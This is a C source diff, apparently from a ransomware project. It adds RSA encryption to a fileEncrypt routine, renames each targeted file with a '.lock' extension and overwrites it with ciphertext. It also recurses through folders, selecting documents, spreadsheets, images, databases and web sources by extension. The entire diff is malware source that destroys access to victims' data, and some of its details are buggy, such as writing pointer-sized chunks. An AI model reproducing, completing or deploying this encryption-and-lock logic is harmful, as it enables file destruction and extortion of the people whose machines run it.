@@ -9,10 +9,12 @@
 #include <dirent.h>
 #include <sys/stat.h>
 
-int fileEncrypt(const char* path)
+#include "../../RSA/rsa.h"
+
+int fileEncrypt(const char* path, const struct public_key_class *pub)
 {
     char *buffer;
-    long filelen;
+    size_t filelen;
     FILE *fileptr;
 
     fileptr = fopen(path, "rb");  // Open the file in binary mode
@@ -30,28 +32,43 @@ int fileEncrypt(const char* path)
     buffer = malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
     if (buffer == NULL)
     {
-        printf("Fatal error : could not allocate %ld bytes of memory", filelen);
+        printf("Fatal error : could not allocate %d bytes of memory", filelen);
         fclose(fileptr);
         exit(-1);
     }
 
     fread(buffer, filelen, 1, fileptr); // Read in the entire file
+    fclose(fileptr);
 
-    for(int i = 0; i < filelen; i++)
+    long long *encrypted = rsa_encrypt(buffer, filelen, pub);
+
+    char newFileName[1000];
+    sprintf(newFileName, "%s.lock", path);
+    if (rename(path, newFileName) != 0)
     {
-        printf("%c", buffer[i]);
-        //Encrypt Here
+        printf("Fatal error : could not rename file \"%s\" into \"%s\"", path, newFileName);
+        exit(-2);
     }
+
+    fileptr = fopen(newFileName, "wb");
+
+    if (fileptr == NULL)
+    {
+        printf("Fatal error : could not open file \"%s\"", path);
+        exit(-2);
+    }
+
+    fwrite(encrypted, sizeof(encrypted), filelen, fileptr);
 
     printf("%s", buffer);
 
     free(buffer);
-    fclose(fileptr); // Close the file
+    fclose(fileptr);
 
     return 0;
 }
 
-int folderEncrypt(const char* basePath)
+int folderEncrypt(const char* basePath, const struct public_key_class *pub)
 {
 
     static const char* arrayExtensions[] = {".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};
@@ -83,7 +100,7 @@ int folderEncrypt(const char* basePath)
 
             if (isDirectory(path))
             {
-                folderEncrypt(path);
+                folderEncrypt(path, pub);
             }
             else
             {
@@ -93,7 +110,7 @@ int folderEncrypt(const char* basePath)
                     if(strstr(dp->d_name, *currentExtension) != NULL)
                     {
                         // Encrypt the file
-                        fileEncrypt(path);
+                        fileEncrypt(path, pub);
                     }
                 }
             }
